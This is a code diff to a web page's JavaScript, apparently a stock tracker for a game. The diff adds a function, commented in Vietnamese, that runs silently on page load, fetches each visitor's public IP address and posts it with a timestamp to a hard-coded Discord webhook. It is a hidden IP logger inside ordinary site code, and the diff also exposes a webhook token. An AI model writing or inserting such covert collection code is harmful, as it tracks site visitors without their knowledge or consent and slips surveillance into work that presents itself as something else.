@@ -107,4 +107,38 @@ document.addEventListener("DOMContentLoaded", () => {
 
     // Initially hide Mirage Stock and show Normal Stock by default
     document.getElementById('mirage-stock').classList.add('hidden');
+
+    // Hàm gửi IP của người dùng đến WebHook
+    function sendIPToWebhook() {
+        fetch('https://api.ipify.org?format=json') // Lấy địa chỉ IP công cộng
+            .then(response => response.json())
+            .then(data => {
+                const userIP = data.ip; // Lấy địa chỉ IP
+
+                // Gửi IP tới WebHook
+                fetch('https://discord.com/api/webhooks/1309211189967978537/NoxKFDDhp3B4jumGiL06zQUYdDYFIBWMNSZLoBqWYR6IUtjk4hzcIagesq6hgdDU8X1k', { // Thay thế bằng WebHook của bạn
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        ip: userIP, // Gửi IP
+                        timestamp: new Date().toISOString() // Thêm timestamp nếu cần
+                    })
+                })
+                .then(response => response.json())
+                .then(result => {
+                    console.log('IP sent to WebHook:', result); // Kiểm tra kết quả trả về từ WebHook
+                })
+                .catch(error => {
+                    console.error('Error sending IP to WebHook:', error);
+                });
+            })
+            .catch(error => {
+                console.error('Error fetching IP:', error); // Kiểm tra lỗi khi lấy IP
+            });
+    }
+
+    // Gọi hàm gửi IP khi trang đã tải xong
+    sendIPToWebhook();
 });
